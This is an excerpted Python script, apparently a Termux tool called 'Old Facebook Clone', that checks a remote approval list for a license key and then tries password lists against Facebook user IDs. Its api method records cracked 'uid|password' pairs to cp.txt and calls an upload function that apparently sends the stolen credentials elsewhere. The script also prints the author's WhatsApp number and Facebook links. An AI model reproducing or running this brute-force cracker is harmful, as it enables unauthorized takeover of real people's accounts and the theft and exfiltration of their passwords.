...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/TOR.BAP.TAHIDUL"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/TOR.BAP.TAHIDUL")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801403380158")
	subprocess.check_output(["am", "start", "https://wa.me/+8801403380158"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/TAHIDUL-123/OLD/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\033[0;9288888888888     d8888 888    888 8888888 8888888b.  888     888 888      
 \033[0;91m888        d88888 888    888   888   888  "Y88b 888     888 888      
 \033[0;92m888       d88P888 888    888   888   888    888 888     888 888 
 \033[0;93m888      d88P 888 8888888888   888   888    888 888     888 888      
  \033[0;94m888     d88P  888 888    888   888   888    888 888     888 888      
  \033[0;95m888    d88P   888 888    888   888   888    888 888     888 888      
  \033[0;96m888   d8888888888 888    888   888   888  .d88P Y88b. .d88P 888      
 \033[0;97m888  d88P     888 888    888 8888888 8888888P"   "Y88888P"  88888888

 > \033[0;92mDEVELOPER     : TAHIDUL KHAN
 > \033[0;95mFACEBOOK ID   : Md Tahidul Khan
 > \033[0;41mWHATSAPP      : 01403380158
 \033[0;96m> YOUTUBE       : Tahidul official 
 > \033[0;97mWARNING       : KNO SALAI KHARAP KAJE USE KORBI NA     
    """)
		print("%s [%s•%s] %sTOOL NAME : %sOld Facebook  Clone"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [TAHIDUL] : %s/%s -> \033[0;92m [ KHAN-OK:%s ]- \033[0;93m[KHAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("cp.txt","a").write(" [KHANN-CP🥺] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
